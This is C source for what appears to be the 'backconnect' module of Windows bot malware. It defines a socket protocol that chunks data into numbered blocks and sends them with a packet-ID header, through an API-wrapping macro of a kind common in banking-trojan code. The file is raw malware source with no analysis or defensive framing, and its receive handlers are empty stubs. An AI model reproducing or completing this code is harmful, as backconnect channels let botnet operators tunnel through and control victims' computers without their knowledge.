#include "protocol.h"

#ifdef MODULE_BACKCONNECT
#include "../common/bot_structs.h"

#include "../common/mem.h"
#include "../common/utils.h"
#include "../common/string.h"

extern bot_t bot;

static packet_t* m_pPendingPackets = NULL;
static DWORD m_dwPendingPacketCount = 0;

void WINAPI InitProtocol(void)
{
	m_pPendingPackets = NULL;
	m_dwPendingPacketCount = 0;
}

void WINAPI HandleHeader(SOCKET hClient, const LPSTR pszData, int iAmount)
{

}

void WINAPI HandleBlock(SOCKET hClient, const LPSTR pszData, int iAmount)
{

}

static DWORD _CountBlocks(const LPSTR pszBuffer)
{
	LPSTR pszBuff = pszBuffer;

	DWORD dwCount, i;

	dwCount = 0;

	while(TRUE)
	{
		for(i = 0; i < BLOCK_SIZE; i++)
		{
			if(pszBuff[i] == 0)
				break;
		}

		pszBuff += i;

		dwCount++;

		if(pszBuff[0] == 0)
			break;
	}

	return dwCount;
}

static LPSTR* _SplitToBlocks(const LPSTR pszBuffer, PDWORD pdwSize)
{
	LPSTR pszBuff;

	LPSTR* arr_pszBlocks;
	DWORD dwBlockCount, dwBufferLength, i, dwBlockSize;

	if((dwBlockCount = _CountBlocks(pszBuffer)) == 0)
		return NULL;

	if((arr_pszBlocks = (LPSTR*)memalloc(sizeof(LPSTR) * dwBlockCount)) == NULL)
		return NULL;

	pszBuff = pszBuffer;

	dwBufferLength = StrLengthA(pszBuff);

	if(dwBufferLength <= BLOCK_SIZE)
	{
		arr_pszBlocks[0] = StrCopyA(pszBuff, dwBufferLength);
	}
	else
	{
		for(i = 0; i < dwBlockCount; i++)
		{
			if(dwBufferLength > BLOCK_SIZE)
				dwBlockSize = BLOCK_SIZE;
			else dwBlockSize = dwBufferLength;

			arr_pszBlocks[i] = StrCopyExA(pszBuff, 0, dwBlockSize);
			pszBuff += dwBlockSize;

			dwBufferLength -= dwBlockSize;
		}
	}

	*pdwSize = dwBlockCount;
	
	return arr_pszBlocks;
}

BOOL WINAPI SendPacket(SOCKET hClient, byte bPacket, const LPSTR pszArguments)
{
	char szPacket[2], szBuffer[1024];
	szPacket[0] = bPacket;
	szPacket[1] = 0x00;

	memzero(&szBuffer, sizeof(szBuffer));

	CWA(wsprintfA)(szBuffer, "%s%s", szPacket, pszArguments);

	return SendPacketEx(hClient, szBuffer);
}

BOOL WINAPI SendPacketEx(SOCKET hClient, const LPSTR pszBuffer)
{
	LPSTR* arr_pszBlocks;
	DWORD i, dwBlocksAmount, dwPacketID, dwHeaderLength, dwBlocksLength;
	char szPacketType[2];
	char szSendBuffer[3072];

	if((arr_pszBlocks = _SplitToBlocks(pszBuffer, &dwBlocksAmount)) == NULL)
		return FALSE;

	dwPacketID = GetRandomNumber();

	szPacketType[0] = 0x1;
	szPacketType[1] = 0x00;

	memzero(&szSendBuffer, sizeof(szSendBuffer));

	dwHeaderLength = CWA(wsprintfA)(szSendBuffer, "%s%d|%d;", szPacketType, dwPacketID, dwBlocksAmount);

	//Send header
	if(CWA(send)(hClient, szSendBuffer, dwHeaderLength, 0) > 0)
	{
		//Send blocks
		szPacketType[0] = 0x2;

		for(i = 0; i < dwBlocksAmount; i++)
		{
			dwBlocksLength = CWA(wsprintfA)(szSendBuffer, "%s%d|%d|%s;", szPacketType, dwPacketID, i, arr_pszBlocks[i]);

			if(CWA(send)(hClient, szSendBuffer, dwBlocksLength, 0) <= 0)
				return FALSE;
		}

		return TRUE;
	}

	return FALSE;
}
#endif